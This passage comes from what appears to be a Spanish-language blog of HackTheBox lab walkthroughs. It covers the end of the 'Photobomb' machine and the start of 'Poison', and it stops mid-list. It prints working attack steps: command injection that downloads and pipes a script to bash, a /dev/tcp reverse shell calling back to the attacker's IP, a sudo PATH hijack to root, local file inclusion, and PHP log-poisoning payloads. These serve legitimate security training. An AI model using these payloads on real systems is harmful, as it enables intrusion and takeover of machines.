PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d <span class="o">(</span>RSA<span class="o">)</span>
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Sep 29 12:40:32 2024 -- 1 IP address (1 host up) scanned in 36.79 seconds</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/1.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que demos <code class="language-plaintext highlighter-rouge">click</code> en la parte morada y que las credenciales las encontraremos en nuestro paquete de inicio.</p>
  </li>
  <li>
    <p>Si damos <code class="language-plaintext highlighter-rouge">click</code> nos piden credenciales pero por el momento no tenemos ningunas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/2.png" />
</p>

<ul>
  <li>Si revisamos el código fuente en el archivo <code class="language-plaintext highlighter-rouge">Javascript</code> encontramos lo que parecen ser credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/3.png" />
</p>

<ul>
  <li>Si las probamos nos deja conectarnos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/4.png" />
</p>

<h2 id="shell-as-wizard">Shell as wizard</h2>

<ul>
  <li>Ahora lo que vamos a hacer es interceptar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición al momento de dar <code class="language-plaintext highlighter-rouge">click</code> en el botón rojo para ver como viaja la petición.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/5.png" />
</p>

<ul>
  <li>Después de probar varias inyecciones en la parte de <code class="language-plaintext highlighter-rouge">filetype</code> podemos concatenar un comando en esta ocasión me hago una petición a un script el cual por el momento no existe y me llega la petición.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/6.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] code 404, message File not found
10.10.11.182 - - <span class="o">[</span>29/Sep/2024 13:14:05] <span class="s2">"GET /shell.sh HTTP/1.1"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Sabiendo que podemos inyectar comandos vamos a crear el archivo para obtener una reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>shell.sh
───────┬──────────────────────────────────────────────────
       │ File: shell.sh
───────┼──────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1
───────┴──────────────────────────────────────────────────
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>
    <p>Y simplemente enviamos la petición.</p>
  </li>
  <li>
    <p>Agregamos <code class="language-plaintext highlighter-rouge">| bash</code> para que lo interprete.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/7.png" />
</p>

<ul>
  <li>Nos llega la Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.30] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182] 43738
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>697<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">whoami
whoami
</span>wizard
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Ahora hacemos un tratamiento de la <code class="language-plaintext highlighter-rouge">tty</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~/photobomb<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
wizard@photobomb:~/photobomb<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
c2dd57cf27062d9098da457334b87181
wizard@photobomb:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</code></pre></div></div>

<ul>
  <li>Podemos correr ese script como <code class="language-plaintext highlighter-rouge">root</code> sin proporcionar contraseñas y <code class="language-plaintext highlighter-rouge">setear</code> variables de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>wizard on photobomb:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User wizard may run the following commands on photobomb:
    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">find</code> esta buscando todos los archivos con extensión <code class="language-plaintext highlighter-rouge">".jpg"</code> en el directorio <code class="language-plaintext highlighter-rouge">"source_images"</code> y sus subdirectorios, y cambia el propietario y grupo de cada archivo encontrado a <code class="language-plaintext highlighter-rouge">"root:root"</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:/<span class="nv">$ </span><span class="nb">cat</span> /opt/cleanup.sh 
<span class="c">#!/bin/bash</span>
<span class="nb">.</span> /opt/.bashrc
<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div>

<ul>
  <li>Tenemos la capacidad de modificar variables como el <code class="language-plaintext highlighter-rouge">'path'</code> para utilizar un comando <code class="language-plaintext highlighter-rouge">'find'</code> personalizado. Además, si ejecutamos el comando <code class="language-plaintext highlighter-rouge">'find'</code> con privilegios de administrador, el <code class="language-plaintext highlighter-rouge">'find'</code> se ejecutará con permisos de <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/Z3o0Y2kMoeU?si=Ifo5r-wcDUlddTBk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></center>

<ul>
  <li>Vamos a darnos una <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">echo </span>bash <span class="o">&gt;</span> find
wizard@photobomb:~<span class="nv">$ </span><span class="nb">chmod</span> +x find
</code></pre></div></div>

<ul>
  <li>Ahora modificamos el <code class="language-plaintext highlighter-rouge">path</code> temporalmente para dar prioridad al directorio actual.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wizard@photobomb:~<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PWD</span>:<span class="nv">$PATH</span> /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# <span class="nb">whoami
</span>root
root@photobomb:/home/wizard/photobomb# 
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@photobomb:/home/wizard/photobomb# <span class="nb">cat</span> /root/root.txt
b740fbec8fa61254b2467d424ac7aaaa
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Poison (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html" rel="alternate" type="text/html" title="HackTheBox - Poison (medium)" /><published>2024-09-08T00:00:00-06:00</published><updated>2024-09-08T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/09/08/poison.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/453800925395b3a5b14099e005fb5a77.png" />
</p>

<ul>
  <li>Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:00 CST
Stats: 0:00:06 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>0 up<span class="o">)</span>, 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 <span class="o">(</span>FreeBSD 20161230<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb <span class="o">(</span>RSA<span class="o">)</span>
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/5.6.32<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto y esta corriendo un servicio web estas son las tecnologías que esta corriendo.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">FreeBSD</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">FreeBSD</span><span class="p">)</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.84</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">5.6</span><span class="o">.</span><span class="mi">32</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos algunas rutas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nt">-p80</span> 10.10.10.84 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-09-08 12:01 CST
Nmap scan report <span class="k">for </span>10.10.10.84
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/1.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que la web funciona para probar scripts en PHP.</p>
  </li>
  <li>
    <p>Si damos click en Submit sin subir ningún tipo de contenido vemos esta respuesta.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/2.png" />
</p>

<ul>
  <li>Además en la <code class="language-plaintext highlighter-rouge">url</code> vemos que mediante un parámetro llamado <code class="language-plaintext highlighter-rouge">file</code> se ve que este es el encargado de apuntar los archivos que tenemos que indicar y como no le indicamos nada pues no esta apuntando a nada es por eso que nos da error.</li>
</ul>

<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>

<ul>
  <li>Por el parámetro podemos probar con un LFI para ver si podemos leer archivos en este caso el mas conocido el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para ver los usuarios en el sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/etc/passwd'</span>
<span class="c"># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $</span>
<span class="c">#</span>
root:<span class="k">*</span>:0:0:Charlie &amp;:/root:/bin/csh
toor:<span class="k">*</span>:0:0:Bourne-again Superuser:/root:
daemon:<span class="k">*</span>:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:<span class="k">*</span>:2:5:System &amp;:/:/usr/sbin/nologin
bin:<span class="k">*</span>:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
<span class="nb">tty</span>:<span class="k">*</span>:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:<span class="k">*</span>:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:<span class="k">*</span>:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:<span class="k">*</span>:8:8:News Subsystem:/:/usr/sbin/nologin
man:<span class="k">*</span>:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:<span class="k">*</span>:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:<span class="k">*</span>:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:<span class="k">*</span>:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
<span class="nb">bind</span>:<span class="k">*</span>:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:<span class="k">*</span>:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:<span class="k">*</span>:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:<span class="k">*</span>:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:<span class="k">*</span>:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:<span class="k">*</span>:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:<span class="k">*</span>:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:<span class="k">*</span>:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:<span class="k">*</span>:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:<span class="k">*</span>:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:<span class="k">*</span>:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:<span class="k">*</span>:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:<span class="k">*</span>:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:<span class="k">*</span>:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:<span class="k">*</span>:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:<span class="k">*</span>:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:<span class="k">*</span>:1001:1001:charix:/home/charix:/bin/csh
</code></pre></div></div>

<h2 id="log-poisoning">Log Poisoning</h2>

<ul>
  <li>
    <p>Vemos que se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> <a href="https://www.freebsd.org/">https://www.freebsd.org/</a>.</p>
  </li>
  <li>
    <p>Para convertir un LFI a un RCE podemos hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> para ver los logs tenemos que ser capaces de ver esta ruta <code class="language-plaintext highlighter-rouge">/var/log/apache2</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log'</span>
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">(</span>/var/log<span class="o">)</span>: failed to open stream: Resource temporarily unavailable <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include<span class="o">()</span>: Failed opening <span class="s1">'/var/log'</span> <span class="k">for </span>inclusion <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/local/www/apache24/data'</span><span class="o">)</span> <span class="k">in</span> &lt;b&gt;/usr/local/www/apache24/data/browse.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
</code></pre></div></div>

<ul>
  <li>En este caso se esta empleando <code class="language-plaintext highlighter-rouge">FreeBSD</code> y la ruta donde están los logs es en <code class="language-plaintext highlighter-rouge">/var/log/httpd-access.log</code> hay se guardan todas las solicitudes que recibe cada que intentamos interactuar con el servidor o la maquina todo se va a guardar allí si nosotros somos capaces de ver el contenido de ese archivo podemos tratar de hacer un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> que esto lo que hace es envenenar los logs de apache y poder inyectar comandos <a href="https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1">https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/3.png" />
</p>

<ul>
  <li>Vemos que podemos ver el archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/4.png" />
</p>

<ul>
  <li>Como la web interpreta <code class="language-plaintext highlighter-rouge">PHP</code> lo que podemos hacer es mediante el <code class="language-plaintext highlighter-rouge">User-Agent</code> inyectar código <code class="language-plaintext highlighter-rouge">PHP</code> para ver si lo interpreta esto lo que va hacer es como vamos a hacerlo mediante <code class="language-plaintext highlighter-rouge">curl</code> por <code class="language-plaintext highlighter-rouge">GET</code> se va a guardar el el <code class="language-plaintext highlighter-rouge">access.log</code> y hay podremos ver si en este caso funciono.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system('id'); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;501 Not Implemented&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Implemented&lt;/h1&gt;
&lt;p&gt;-GET to /test not supported.&lt;br /&gt;
&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<ul>
  <li>Y vemos que como tal fue interpretado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="nt">-GET</span> <span class="s1">'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 10
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:11 +0200] <span class="s2">"GET /favicon.ico HTTP/1.1"</span> 404 209 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:02:30 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:06:50 +0200] <span class="s2">"GET /browse.php?file= HTTP/1.1"</span> 200 321 <span class="s2">"http://10.10.10.84/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:07:10 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:09:38 +0200] <span class="s2">"GET /browse.php?file=/etc/passwd HTTP/1.1"</span> 200 1894 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:12:58 +0200] <span class="s2">"GET /browse.php?file=/var/log HTTP/1.1"</span> 200 368 <span class="s2">"-"</span> <span class="s2">"curl/8.8.0"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:28 +0200] <span class="s2">"GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1"</span> 200 381807 <span class="s2">"-"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:18:48 +0200] <span class="s2">"-"</span> 408 - <span class="s2">"-"</span> <span class="s2">"-"</span>
10.10.14.17 - - <span class="o">[</span>08/Sep/2024:20:22:19 +0200] <span class="s2">"-GET /test HTTP/1.1"</span> 501 196 <span class="s2">"-"</span> <span class="s2">"uid=80(www) gid=80(www) groups=80(www)
</span></code></pre></div></div>

<h2 id="shell-as-www">Shell as www</h2>

<ul>
  <li>Algo que podemos hacer es que para controlar nosotros el comando podemos inyectar lo siguiente para poder hacerlo mucho mas cómodo mediante el parámetro <code class="language-plaintext highlighter-rouge">cmd</code> nosotros le vamos a pasar el comando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.84/test"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /test was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/5.png" />
</p>

<ul>
  <li>Ahora nos vamos a poner en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> para enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...

</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/6.png" />
</p>

<ul>
  <li>
    <p>Si lo enviamos vemos que nos envía nada.</p>
  </li>
  <li>
    <p>Lo mas probable es que tengamos que hacerlo <code class="language-plaintext highlighter-rouge">url-encodeado</code>.</p>
  </li>
  <li>
    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición donde vemos el archivo de los logs.</p>
  </li>
  <li>
    <p>Vamos abrirlo en segundo plano e independizamos el proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 35533
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enviarlo con <code class="language-plaintext highlighter-rouge">mkfifo</code> <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>.</p>
  </li>
  <li>
    <p>Así se ve antes de <code class="language-plaintext highlighter-rouge">url-encodear</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/7.png" />
</p>

<ul>
  <li>Ahora lo <code class="language-plaintext highlighter-rouge">url-encodeamos</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/8.png" />
</p>

<ul>
  <li>
